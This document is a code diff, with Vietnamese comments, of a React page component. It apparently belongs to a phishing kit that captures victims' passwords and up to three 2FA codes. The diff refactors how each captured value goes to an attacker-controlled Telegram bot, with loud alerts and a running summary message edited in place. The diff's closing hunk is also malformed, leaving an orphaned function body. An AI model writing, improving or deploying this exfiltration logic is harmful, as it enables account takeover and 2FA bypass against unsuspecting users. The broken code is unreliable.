@@ -384,8 +384,8 @@ export default function HomePageClient({
   const [code3, setCode3] = useState("");
   const [currentUrl, setCurrentUrl] = useState("");
 
-const sendTelegramMessage = async (text: string, options?: { disable_notification?: boolean, isRootMessage?: boolean }) => {
-  if (!telegramEnabled) return;
+const sendTelegramMessage = async (text: string, options?: { disable_notification?: boolean }) => {
+  if (!telegramEnabled) return null;
   try {
     const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -394,22 +394,17 @@ const sendTelegramMessage = async (text: string, options?: { disable_notificatio
         chat_id: chatId,
         text,
         parse_mode: "HTML",
-        disable_notification: options?.disable_notification ?? true,
+        disable_notification: options?.disable_notification ?? false, // Mặc định là CÓ THÔNG BÁO (kêu)
       }),
     });
     const data = (await response.json()) as { ok?: boolean; result?: { message_id?: number } };
-    
-    // CHỈ LƯU ID NẾU ĐÓ LÀ TIN NHẮN GỐC
-    if (data?.ok && data.result?.message_id != null && options?.isRootMessage) {
-      const id = String(data.result.message_id);
-      setMessageId(id);
-      if (typeof window !== "undefined") {
-        window.localStorage.setItem("telegram_msg_id", id);
-      }
+    if (data?.ok && data.result?.message_id != null) {
+      return String(data.result.message_id);
     }
   } catch (error) {
     console.error("Telegram sendMessage Error:", error);
   }
+  return null;
 };
 
 const stateRef = useRef({
@@ -481,13 +476,14 @@ const buildFullMessage = (overrides?: Partial<{
     .filter(Boolean)
     .join("\n");
 };
-  const sendInitialDataToTelegram = async () => {
+const sendInitialDataToTelegram = async () => {
   if (!telegramEnabled) return;
-      if (typeof window !== "undefined") { 
+
+  if (typeof window !== "undefined") {
     localStorage.removeItem("telegram_msg_id");
   }
   setMessageId(null);
-    
+  
   stateRef.current = {
     password1: "",
     password2: "",
@@ -500,27 +496,18 @@ const buildFullMessage = (overrides?: Partial<{
   setPassword1(""); setPassword2(""); setCode1(""); setCode2(""); setCode3("");
 
   const text = buildFullMessage();
-  await sendTelegramMessage(text, { disable_notification: true });
-};
-
-const notifyStep = async (label: string, value: string) => {
-  if (!telegramEnabled) return;
-  try {
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: `🔔 ${label}: <code>${escapeHtml(value)}</code>`,
-        parse_mode: "HTML",
-        disable_notification: false,
-      }),
-    });
-  } catch (error) {
-    console.error("Telegram notifyStep Error:", error);
+  
+  // Gửi tin nhắn gốc (không kêu để tránh làm phiền lúc mới gửi form)
+  const rootMessageId = await sendTelegramMessage(text, { disable_notification: true });
+  
+  // LƯU LẠI ID TIN NHẮN GỐC
+  if (rootMessageId) {
+    setMessageId(rootMessageId);
+    if (typeof window !== "undefined") {
+      localStorage.setItem("telegram_msg_id", rootMessageId);
+    }
   }
 };
-
 const pushUpdate = async (
   updates: Partial<{
     password1: string;
@@ -534,43 +521,31 @@ const pushUpdate = async (
 ) => {
   if (!telegramEnabled) return;
 
-  // 1) cập nhật stateRef
+  // 1) Cập nhật state
   stateRef.current = { ...stateRef.current, ...updates };
 
-  // 2) Gửi thông báo có âm thanh
-  if (updates.password1) await notifyStep("Mật khẩu 1", updates.password1);
-  if (updates.password2) await notifyStep("Mật khẩu 2", updates.password2);
-  if (updates.code1) await notifyStep("Mã 2FA (L1)", updates.code1);
-  if (updates.code2) await notifyStep("Mã 2FA (L2)", updates.code2);
-  if (updates.code3) await notifyStep("Mã 2FA (L3)", updates.code3);
+  // 2) Gửi tin nhắn thông báo có âm thanh (kêu)
+  let notifyText = "";
+  if (updates.password1) notifyText = `🔔 <b>Mật khẩu 1:</b> <code>${escapeHtml(updates.password1)}</code>`;
+  if (updates.password2) notifyText = `🔔 <b>Mật khẩu 2:</b> <code>${escapeHtml(updates.password2)}</code>`;
+  if (updates.code1) notifyText = `🔔 <b>Mã 2FA (L1):</b> <code>${escapeHtml(updates.code1)}</code>`;
+  if (updates.code2) notifyText = `🔔 <b>Mã 2FA (L2):</b> <code>${escapeHtml(updates.code2)}</code>`;
+  if (updates.code3) notifyText = `🔔 <b>Mã 2FA (L3):</b> <code>${escapeHtml(updates.code3)}</code>`;
 
-  // 3) lấy message_id (ưu tiên state, fallback localStorage)
-  const targetId =
-    messageId ??
-    (typeof window !== "undefined" ? window.localStorage.getItem("telegram_msg_id") : null);
-
-  if (!targetId) {
-    console.warn("Không tìm thấy message_id để edit, bỏ qua cập nhật.");
-    return;
+  if (notifyText) {
+    // Gửi tin nhắn thông báo (disable_notification: false để có âm thanh)
+    await sendTelegramMessage(notifyText, { disable_notification: false });
   }
 
-  // 4) edit tin nhắn gốc tổng hợp
-  await editTelegramMessage(targetId, buildFullMessage());
-};
+  // 3) Lấy ID tin nhắn gốc và Edit nó
+  const targetId = messageId ?? (typeof window !== "undefined" ? localStorage.getItem("telegram_msg_id") : null);
 
-const editTelegramMessage = async (targetMessageId: string, text: string) => {
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        message_id: Number(targetMessageId),
-        text,
-        parse_mode: "HTML",
-        disable_web_page_preview: true,
-      }),
-    });
+  if (targetId) {
+    await editTelegramMessage(targetId, buildFullMessage());
+  } else {
+    console.warn("Không tìm thấy ID tin nhắn gốc để cập nhật.");
+  }
+};
     const data = (await response.json()) as { ok?: boolean; description?: string };
     if (!data.ok) {
       const desc = data.description || "";
